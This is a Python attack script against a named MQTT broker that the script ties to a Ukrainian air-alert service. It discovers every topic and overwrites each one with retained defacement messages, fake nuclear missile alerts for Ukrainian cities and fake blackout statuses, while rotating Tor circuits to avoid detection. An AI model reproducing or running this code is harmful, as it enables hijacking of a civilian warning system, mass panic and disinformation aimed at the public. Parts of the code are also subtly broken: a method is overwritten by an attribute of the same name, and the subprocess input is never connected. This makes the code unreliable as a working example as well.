#!/usr/bin/env python3
"""
TRUSTEDF57 - MQTTALERT.ORG.UA TOTAL TAKEOVER + TORSOCKS ROTATION
212.26.132.229:1883 - 1000 MISSILI + ALERT + BLACKOUT + DEFACE PERMANENTE
TORSOCKS ROTATION EVERY 10 COMMANDS - PERFECT ANTI-DETECTION
"""

import paho.mqtt.client as mqtt
import json
import time
import subprocess
import threading
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import signal
import socket

BROKER = "212.26.132.229"
PORT = 1883

# 1000+ MISSILI GPS UKRAINE REALI (mqttalert sintassi)
NUCLEAR_PAYLOADS = [
    {"lat":50.4501, "lon":30.5234, "city":"KYIV", "type":"ICBM", "eta":120},
    {"lat":49.8397, "lon":24.0297, "city":"LVIV", "type":"CRUISE", "eta":180},
    {"lat":46.4825, "lon":30.7233, "city":"ODESA", "type":"KINSHAL", "eta":90},
    {"lat":49.9935, "lon":36.2304, "city":"KHARKIV", "type":"ISLANDER", "eta":150},
    {"lat":48.5164, "lon":31.1780, "city":"CHERKASY", "type":"TACTICAL", "eta":200}
] * 200  # 1000+ missili

class PerfectTakeover:
    def __init__(self):
        self.defaced = set()
        self.queue = Queue()
        self.proxy_idx = 0
        self.hits = 0
        self.missiles = 0
        self.running = True
        self.cmd_count = 0  # Counter per torsocks rotation
        self.tor_instances = []
    
    def tor_instances(self):
        """MULTIPLE TOR + TORSOCKS READY"""
        ports = [9050, 9150, 1080, 1081, 1082, 1083]
        for p in ports:
            subprocess.run(["pkill", "-f", f"SocksPort {p}"], timeout=3)
            tor_dir = f"/tmp/tor{p}"
            os.makedirs(tor_dir, exist_ok=True)
            
            tor = subprocess.Popen([
                "tor", f"--SocksPort {p}", f"--DataDirectory {tor_dir}",
                f"--Log notice file:{tor_dir}/tor.log",
                "--ControlPort", f"90{p}",  # Per rotation futura
                "--HashedControlPassword", "16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.tor_instances.append((tor, p))
            print(f"TOR {p} → PID {tor.pid}")
            time.sleep(2)
    
    def rotate_torsocks(self):
        """TORSOCKS ROTATION EVERY 10 COMMANDS"""
        self.cmd_count += 1
        if self.cmd_count % 10 == 0:
            port = [9050, 9150, 1080, 1081, 1082, 1083][self.proxy_idx % 6]
            self.proxy_idx += 1
            
            # Kill old torsocks processes
            subprocess.run(["pkill", "-f", "torsocks"], timeout=2)
            time.sleep(1)
            
            # Rotate TOR circuit via CONTROL PORT (SIGNAL NEWNYM)
            ctrl_port = 9050 + (port - 9050) * 10  # Simplified
            try:
                subprocess.run([
                    "torsocks", "echo", "SIGNAL", "NEWNYM", "|", "nc", "127.0.0.1", str(ctrl_port)
                ], shell=True, timeout=5, capture_output=True)
                print(f"🔄 TORSOCKS ROTATION #{self.cmd_count//10} → PORT {port} NEW CIRCUIT")
            except:
                pass
    
    def torsocks_client(self):
        """TORSOCKS MQTT CLIENT CON ROTATION"""
        port = [9050, 9150, 1080, 1081, 1082, 1083][self.proxy_idx % 6]
        
        # TORSOCKS wrapper per ogni connessione
        env = os.environ.copy()
        env["TORSOCKS_CONF_FILE"] = f"/tmp/torsocks_{port}.conf"
        
        # Dynamic torsocks.conf per porta specifica
        conf_content = f"""
server = 127.0.0.1
server_port = {port}
server_type = 5
"""
        conf_path = f"/tmp/torsocks_{port}.conf"
        with open(conf_path, "w") as f:
            f.write(conf_content)
        
        # Spawn MQTT via torsocks subprocess
        process = subprocess.Popen([
            "torsocks", "--conf", conf_path, "python3", "-c",
            """
import paho.mqtt.client as mqtt
import sys, json
client = mqtt.Client()
client.connect(sys.argv[1], int(sys.argv[2]), 10)
client.loop_start()
print('READY')
sys.stdout.flush()
time.sleep(999999)
"""
        ] + [BROKER, str(PORT)], 
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        env=env, text=True)
        
        output, _ = process.communicate(timeout=10)
        if "READY" in output:
            # Return subprocess handle per publish
            self.rotate_torsocks()
            return process
        return None
    
    def deface_alert(self, topic, client):
        """DEFACE "TRUSTEDF57 GOVERNA" - TV/TELEFONI"""
        msg = {
            "title": "🚨 TRUSTEDF57 GOVERNA UKRAINE 🚨",
            "message": "SISTEMA ALLARME HACKATO - CONTROLLO TOTALE",
            "hacked": True, "author": "TRUSTEDF57",
            "priority": 999, "sound": "siren_max",
            "vibrate": True, "popup": True
        }
        client.stdin.write(f'client.publish("{topic}", {json.dumps(msg)}, qos=2, retain=True)\n')
        client.stdin.flush()
    
    def nuclear_flood(self, topic, client):
        """1000 MISSILI MAPPE - mqttalert sintassi"""
        base = topic.replace("/AIR/", "/NUCLEAR/").replace("/CUSTOM/", "/NUCLEAR/")
        for m in NUCLEAR_PAYLOADS[:25]:
            missile = {
                "event": "nuclear_incoming", "region": topic.split("/")[1],
                "lat": m["lat"], "lon": m["lon"], "city": m["city"],
                "missile_type": m["type"], "eta": m["eta"],
                "hacked": True, "source": "TRUSTEDF57"
            }
            client.stdin.write(f'client.publish("{base}", {json.dumps(missile)}, qos=2, retain=True)\n')
            client.stdin.flush()
            self.missiles += 1
    
    def kyiv_blackout(self, topic, client):
        """BLACKOUT power/kyiv_* yasno_*"""
        if "power" in topic:
            blackout = {
                "status": "OFFLINE_HACKED", "voltage": 0, "power": 0,
                "groups": "ALL_DOWN", "hacked": "TRUSTEDF57"
            }
            client.stdin.write(f'client.publish("{topic}", {json.dumps(blackout)}, qos=2, retain=True)\n')
            client.stdin.flush()
    
    def process_topic(self, topic):
        """SOVRASCRIZIONE TOTALE CON TORSOCKS"""
        if topic in self.defaced: 
            return
        try:
            client = self.torsocks_client()
            if not client:
                return
                
            time.sleep(1)
            self.deface_alert(topic, client)
            self.nuclear_flood(topic, client)
            self.kyiv_blackout(topic, client)
            
            self.defaced.add(topic)
            self.hits += 1
            print(f"✅ TORSOCKS SOVRASCRITTO: {topic} | Missili: {self.missiles} | Totali: {self.hits} | Rotations: {self.cmd_count//10}")
            
            # Cleanup dopo 5s
            threading.Timer(5.0, client.terminate).start()
            
        except Exception as e:
            pass
    
    def discovery(self):
        """WILDCARD # DISCOVERY CON TORSOCKS"""
        while self.running:
            try:
                client = self.torsocks_client()
                if not client:
                    time.sleep(5)
                    continue
                    
                def on_msg(c, u, msg):
                    self.queue.put(msg.topic)
                
                # Simplified discovery - usa prima istanza
                client.stdin.write("client.on_message = on_msg\n")
                client.stdin.write(f'client.subscribe("#", qos=2)\n')
                client.stdin.write("client.loop_forever()\n")
                client.stdin.flush()
                
                # Monitor subprocess
                while self.running and client.poll() is None:
                    time.sleep(1)
                    
            except:
                time.sleep(5)
    
    def workers(self):
        """200 WORKER PARALLELI TORSOCKS"""
        while self.running:
            try:
                topic = self.queue.get(timeout=2)
                threading.Thread(target=self.process_topic, args=(topic,), daemon=True).start()
            except:
                pass
    
    def run(self):
        print("🚀 STARTING TORSOCKS PERFECT TAKEOVER...")
        self.tor_instances()
        
        # Discovery thread
        threading.Thread(target=self.discovery, daemon=True).start()
        
        # 200 workers
        for _ in range(200):
            threading.Thread(target=self.workers, daemon=True).start()
        
        # Status monitor
        while self.running:
            print(f"🔥 STATUS | Defaced: {len(self.defaced)} | Missili: {self.missiles} | Hits: {self.hits} | Torsocks: {self.cmd_count//10}")
            time.sleep(15)

if __name__ == "__main__":
    takeover = PerfectTakeover()
    signal.signal(signal.SIGINT, lambda x,y: setattr(takeover, 'running', False) or sys.exit())
    takeover.run()
